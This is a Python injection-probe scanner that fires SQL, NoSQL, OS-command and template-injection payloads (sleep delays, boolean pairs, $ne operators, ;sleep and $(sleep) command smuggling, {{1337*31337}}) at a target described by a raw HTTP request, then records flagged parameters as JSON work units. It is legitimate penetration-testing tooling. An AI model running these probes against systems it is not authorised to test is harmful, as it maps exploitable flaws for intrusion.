#!/usr/bin/env python3
"""inject_probe.py - per-class injection probe pass over a raw HTTP request.

Takes a saved raw HTTP request file containing one or more `*` injection
markers (sqlmap-style), establishes a baseline, then fires built-in probe sets
(sqli / nosqli / cmd / ssti) one variable at a time. Flags anomalies:

  - SQL/LDAP/XPath error signatures in the response body
  - time deltas scaling with injected sleep payloads
  - boolean TRUE/FALSE pair length splits
  - reflected template math (1337*31337 -> 41897569)
  - NoSQL operator type-substitution behavior changes

Emits a work-unit JSON array (one unit per param x class hit) written
atomically for rupu fan-out:

  [{"id": "inj-001-sqli", "title": "SQLi candidate (time-based)",
    "targets": ["https://api.example.com/v1/x", "POST /v1/x", "param:q"],
    "hints": ["sqli-time", "run-sqlmap", "sleep=5"]}]

Usage:
  python3 scripts/inject_probe.py request.txt [--scheme https] [--port N]
      [--classes sqli,nosqli,cmd,ssti] [--sleep 5] [--timeout 30]
      [--benign 1] [--proxy http://127.0.0.1:8080]
      [--out reports/api-injection-units.json]

Marker rules:
  - `*` marks an injection point in the request line, a header, or the body.
  - If the marker appears quoted in a JSON body ("field": "*"), raw-JSON
    probes (NoSQL operators) replace the quotes too; string probes land
    inside them, JSON-escaped.
  - Multiple markers are tested one at a time; the others are filled with
    the benign value.

stdlib only. No third-party imports.
"""

import argparse
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.request

MARKER = "*"
TARGET_CAP = 200

ERROR_SIGNATURES = [
    (r"you have an error in your sql syntax", "mysql"),
    (r"warning:\s*mysqli?", "mysql"),
    (r"mariadb server version", "mysql"),
    (r"unterminated quoted string", "postgresql"),
    (r"syntax error at or near", "postgresql"),
    (r"pg_query\(\)", "postgresql"),
    (r"unclosed quotation mark", "mssql"),
    (r"microsoft ole db provider", "mssql"),
    (r"odbc sql server driver", "mssql"),
    (r"ora-\d{5}", "oracle"),
    (r"sqlite3?::", "sqlite"),
    (r"near \".*\": syntax error", "sqlite"),
    (r"sqlstate\[", "generic-sql"),
    (r"jdbc(exception|template)", "generic-sql"),
    (r"mongoerror", "mongodb"),
    (r"bad search filter", "ldap"),
    (r"invalid dn syntax", "ldap"),
    (r"javax\.naming\.directory", "ldap"),
    (r"xpathexception", "xpath"),
    (r"jinja2\.exceptions", "ssti-jinja2"),
    (r"twig\\error", "ssti-twig"),
    (r"freemarker\.core\.", "ssti-freemarker"),
    (r"templatesyntaxerror", "ssti"),
]

SSTI_A, SSTI_B = 1337, 31337
SSTI_PRODUCT = str(SSTI_A * SSTI_B)  # 41897569


def build_probes(sleep_s):
    """Return list of probe dicts.

    kind: error | time | reflect | pair
    raw:  True -> replace a quoted "*" marker including its quotes
    """
    s = str(sleep_s)
    probes = []

    def add(cls, name, kind, payload, raw=False, pair_false=None):
        probes.append({
            "class": cls, "name": name, "kind": kind, "payload": payload,
            "raw": raw, "pair_false": pair_false,
        })

    # --- SQLi ---
    add("sqli", "single-quote", "error", "'")
    add("sqli", "double-quote", "error", '"')
    add("sqli", "quote-paren", "error", "')")
    add("sqli", "bool-string", "pair", "' OR '1'='1", pair_false="' AND '1'='2")
    add("sqli", "bool-numeric", "pair", "1 OR 1=1", pair_false="1 AND 1=2")
    add("sqli", "bool-paren", "pair", "1)) OR 1=1-- -", pair_false="1)) AND 1=2-- -")
    add("sqli", "time-mysql-num", "time", "1 AND SLEEP(%s)" % s)
    add("sqli", "time-mysql-str", "time", "' AND SLEEP(%s)-- -" % s)
    add("sqli", "time-pgsql", "time", "'||pg_sleep(%s)--" % s)
    add("sqli", "time-mssql", "time", "1;WAITFOR DELAY '0:0:%s'--" % s)

    # --- NoSQLi (raw probes need a quoted "*" marker in a JSON body) ---
    add("nosqli", "op-ne", "pair", '{"$ne": null}', raw=True,
        pair_false='{"$eq": "zz-no-such-value-zz"}')
    add("nosqli", "op-gt", "pair", '{"$gt": ""}', raw=True,
        pair_false='{"$eq": "zz-no-such-value-zz"}')
    add("nosqli", "op-regex", "pair", '{"$regex": ".*"}', raw=True,
        pair_false='{"$regex": "^zz-no-such-value-zz$"}')
    add("nosqli", "where-break", "error", "' || '1'=='1")
    add("nosqli", "where-time", "time", "'; sleep(%s000); var x='" % s)
    add("nosqli", "where-time-raw", "time",
        '{"$where": "sleep(%s000) || true"}' % s, raw=True)

    # --- OS command injection (time-based) ---
    add("cmd", "semicolon-sleep", "time", ";sleep %s" % s)
    add("cmd", "pipe-sleep", "time", "|sleep %s" % s)
    add("cmd", "and-sleep", "time", "&&sleep %s" % s)
    add("cmd", "subshell-sleep", "time", "$(sleep %s)" % s)
    add("cmd", "backtick-sleep", "time", "`sleep %s`" % s)
    add("cmd", "newline-sleep", "time", "\nsleep %s" % s)
    add("cmd", "win-ping", "time", "& ping -n %d 127.0.0.1" % (sleep_s + 1))

    # --- SSTI (reflected eval) ---
    expr = "%d*%d" % (SSTI_A, SSTI_B)
    add("ssti", "jinja-twig", "reflect", "{{%s}}" % expr)
    add("ssti", "freemarker-el", "reflect", "${%s}" % expr)
    add("ssti", "ruby-thyme", "reflect", "#{%s}" % expr)
    add("ssti", "erb", "reflect", "<%%=%s%%>" % expr)
    add("ssti", "spring-el", "reflect", "${{%s}}" % expr)

    return probes


# ---------------------------------------------------------------- request IO

def parse_raw_request(text):
    text = text.replace("\r\n", "\n")
    head, sep, body = text.partition("\n\n")
    lines = head.split("\n")
    try:
        method, path, _version = lines[0].split(None, 2)
    except ValueError:
        sys.exit("[!] bad request line: %r" % lines[0])
    headers = []
    for line in lines[1:]:
        if not line.strip():
            continue
        k, _, v = line.partition(":")
        headers.append((k.strip(), v.strip()))
    return method.upper(), path, headers, body


def marker_slots(method, path, headers, body):
    """Find marker positions. Returns list of (where, index) with where in
    {'path','header:<name>','body'} and index = occurrence inside that part."""
    slots = []
    for i in range(path.count(MARKER)):
        slots.append(("path", i))
    for name, val in headers:
        for i in range(val.count(MARKER)):
            slots.append(("header:" + name, i))
    for i in range(body.count(MARKER)):
        slots.append(("body", i))
    return slots


def replace_nth(text, old, new, n):
    idx = -1
    for _ in range(n + 1):
        idx = text.find(old, idx + 1)
        if idx == -1:
            return text
    return text[:idx] + new + text[idx + len(old):]


def json_escape(payload):
    return json.dumps(payload)[1:-1]


def render(method, path, headers, body, slots, active, payload, raw, benign):
    """Fill the active slot with payload, the rest with benign."""
    path_r, body_r = path, body
    headers_r = list(headers)
    # Process in reverse textual order is unnecessary since replace_nth works
    # on occurrence counts of the remaining markers; fill all slots left->right
    # tracking consumed occurrences per part.
    counters = {"path": 0, "body": 0}
    hdr_counters = {}
    for si, (where, _occ) in enumerate(slots):
        is_active = (si == active)
        if where == "path":
            val = payload if is_active else benign
            from urllib.parse import quote
            val_enc = quote(val, safe="") if is_active else val
            path_r = replace_nth(path_r, MARKER, val_enc, 0)
        elif where == "body":
            if is_active and raw:
                qm = '"%s"' % MARKER
                if qm in body_r:
                    body_r = body_r.replace(qm, payload, 1)
                else:
                    body_r = replace_nth(body_r, MARKER, json_escape(payload), 0)
            else:
                val = json_escape(payload) if is_active else benign
                body_r = replace_nth(body_r, MARKER, val, 0)
        else:
            hname = where.split(":", 1)[1]
            hdr_counters.setdefault(hname, 0)
            val = payload if is_active else benign
            for j, (k, v) in enumerate(headers_r):
                if k == hname and MARKER in v:
                    headers_r[j] = (k, replace_nth(v, MARKER, val, 0))
                    break
    _ = counters
    return method, path_r, headers_r, body_r


def param_name_for_slot(path, headers, body, slot):
    """Best-effort param name near the marker occurrence."""
    where, occ = slot
    if where.startswith("header:"):
        return where.split(":", 1)[1]
    text = path if where == "path" else body
    idx = -1
    for _ in range(occ + 1):
        idx = text.find(MARKER, idx + 1)
    before = text[:idx]
    if where == "path":
        m = re.findall(r"[?&]([A-Za-z0-9_.\[\]-]+)=[^&?]*$", before)
        if m:
            return m[-1]
        return "path-segment"
    m = re.findall(r'"([A-Za-z0-9_.\[\]-]+)"\s*:\s*"?[^"{}\[\],]*$', before)
    if m:
        return m[-1]
    m = re.findall(r"([A-Za-z0-9_.\[\]-]+)=[^&]*$", before)
    if m:
        return m[-1]
    return "body-offset-%d" % idx


def send(url, method, headers, body, timeout, proxy):
    data = body.encode("utf-8", "surrogateescape") if body else None
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in headers:
        if k.lower() in ("content-length", "host"):
            continue
        req.add_header(k, v)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler(
            {"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    start = time.monotonic()
    try:
        resp = opener.open(req, timeout=timeout)
        rbody = resp.read()
        status = resp.status
    except urllib.error.HTTPError as e:
        rbody = e.read()
        status = e.code
    except Exception as e:
        return {"status": 0, "length": 0, "time": time.monotonic() - start,
                "body": b"", "error": str(e)}
    return {"status": status, "length": len(rbody),
            "time": time.monotonic() - start, "body": rbody, "error": None}


# ---------------------------------------------------------------- detection

def match_errors(body_bytes):
    low = body_bytes.decode("utf-8", "replace").lower()
    hits = []
    for pat, label in ERROR_SIGNATURES:
        if re.search(pat, low):
            hits.append(label)
    return hits


def length_split(a, b, baseline_len):
    threshold = max(32, int(baseline_len * 0.10))
    return abs(a - b) > threshold


# ---------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("request", help="raw HTTP request file with * markers")
    ap.add_argument("--scheme", default="https", choices=["http", "https"])
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--classes", default="sqli,nosqli,cmd,ssti")
    ap.add_argument("--sleep", type=int, default=5)
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--benign", default="1")
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--out", default="reports/api-injection-units.json")
    args = ap.parse_args()

    with open(args.request, "r", encoding="utf-8", errors="surrogateescape") as f:
        method, path, headers, body = parse_raw_request(f.read())

    host = next((v for k, v in headers if k.lower() == "host"), None)
    if not host:
        sys.exit("[!] request has no Host header")
    netloc = host if args.port is None else "%s:%d" % (host.split(":")[0], args.port)
    base_url = "%s://%s" % (args.scheme, netloc)

    slots = marker_slots(method, path, headers, body)
    if not slots:
        sys.exit("[!] no '%s' marker found in request" % MARKER)
    classes = set(args.classes.split(","))
    probes = [p for p in build_probes(args.sleep) if p["class"] in classes]

    route = "%s %s" % (method, path.replace(MARKER, "").split("?")[0])
    units, uid = [], 0
    for si, slot in enumerate(slots):
        pname = param_name_for_slot(path, headers, body, slot)
        # baseline: benign value in every slot, twice (max time for jitter)
        m, p, h, b = render(method, path, headers, body, slots, -1,
                            args.benign, False, args.benign)
        base1 = send(base_url + p, m, h, b, args.timeout, args.proxy)
        base2 = send(base_url + p, m, h, b, args.timeout, args.proxy)
        if base1["error"] and base2["error"]:
            print("[!] slot %d (%s): baseline failed: %s"
                  % (si, pname, base1["error"]), file=sys.stderr)
            continue
        good = base1 if not base1["error"] else base2
        base_time = max(base1["time"], base2["time"])
        base_len = good["length"]
        base_status = good["status"]
        print("[*] slot %d param=%s baseline status=%d len=%d t=%.2fs"
              % (si, pname, base_status, base_len, base_time))

        flagged = {}  # class -> set of hint strings

        def flag(cls, hint, detail):
            flagged.setdefault(cls, set()).add(hint)
            print("    [+] %s %s (%s)" % (cls, hint, detail))

        for probe in probes:
            m, p, h, b = render(method, path, headers, body, slots, si,
                                probe["payload"], probe["raw"], args.benign)
            r = send(base_url + p, m, h, b,
                     max(args.timeout, args.sleep * 2 + 10), args.proxy)
            if r["error"]:
                continue
            kind = probe["kind"]
            if kind in ("error", "pair", "time", "reflect"):
                for label in match_errors(r["body"]):
                    cls = "ssti" if label.startswith("ssti") else probe["class"]
                    flag(cls, "%s-error" % ("sqli" if cls == "sqli" else cls),
                         "signature=%s probe=%s" % (label, probe["name"]))
            if kind == "time":
                if r["time"] > base_time + args.sleep - 1:
                    # confirm the delta scales: re-send with double sleep
                    dbl = probe["payload"].replace(
                        str(args.sleep), str(args.sleep * 2))
                    m2, p2, h2, b2 = render(method, path, headers, body,
                                            slots, si, dbl, probe["raw"],
                                            args.benign)
                    r2 = send(base_url + p2, m2, h2, b2,
                              args.sleep * 3 + 15, args.proxy)
                    if not r2["error"] and r2["time"] > base_time + args.sleep * 2 - 1:
                        flag(probe["class"], probe["class"] + "-time",
                             "probe=%s t=%.1fs/%.1fs" %
                             (probe["name"], r["time"], r2["time"]))
            elif kind == "reflect":
                body_txt = r["body"].decode("utf-8", "replace")
                if SSTI_PRODUCT in body_txt and probe["payload"] not in body_txt:
                    flag("ssti", "ssti-eval", "probe=%s" % probe["name"])
            elif kind == "pair":
                m2, p2, h2, b2 = render(method, path, headers, body, slots,
                                        si, probe["pair_false"], probe["raw"],
                                        args.benign)
                r2 = send(base_url + p2, m2, h2, b2, args.timeout, args.proxy)
                if r2["error"]:
                    continue
                if (r["status"] != r2["status"]
                        or length_split(r["length"], r2["length"], base_len)):
                    hint = ("nosqli-operator" if probe["class"] == "nosqli"
                            else "sqli-boolean")
                    flag(probe["class"], hint,
                         "probe=%s true=%d/%dB false=%d/%dB" %
                         (probe["name"], r["status"], r["length"],
                          r2["status"], r2["length"]))

        url_clean = (base_url + path.replace(MARKER, "")).split("?")[0]
        titles = {"sqli": "SQLi candidate", "nosqli": "NoSQLi candidate",
                  "cmd": "Command injection candidate",
                  "ssti": "SSTI candidate"}
        follow = {"sqli": "run-sqlmap", "nosqli": "run-manual",
                  "cmd": "run-manual", "ssti": "run-tplmap"}
        for cls, hints in sorted(flagged.items()):
            uid += 1
            units.append({
                "id": "inj-%03d-%s" % (uid, cls),
                "title": titles.get(cls, "Injection candidate"),
                "targets": [url_clean[:TARGET_CAP], route[:TARGET_CAP],
                            ("param:" + pname)[:TARGET_CAP]],
                "hints": sorted(hints) + [follow.get(cls, "run-manual"),
                                          "sleep=%d" % args.sleep],
            })

    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    tmp = args.out + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(units, f, indent=2)
        f.write("\n")
    os.replace(tmp, args.out)
    print("[*] %d work unit(s) -> %s" % (len(units), args.out))


if __name__ == "__main__":
    main()
